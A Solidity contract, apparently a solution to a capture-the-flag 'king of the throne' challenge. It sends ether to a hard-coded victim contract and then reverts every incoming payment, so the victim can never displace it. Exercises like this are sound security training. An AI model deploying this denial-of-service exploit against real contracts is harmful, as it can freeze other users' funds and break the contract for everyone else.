// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // Your victim's contract instance.
    address victim = 0xb20da0c083992C7a5561Ea70c57D27E58a53Ba3b;

    function attack() external payable {
        // We use call here instead transfer because transfer
        // has a gas limit and runs out of gas.
        (bool success, ) = payable(address(victim)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "you cannot claim the throne!");
    }
}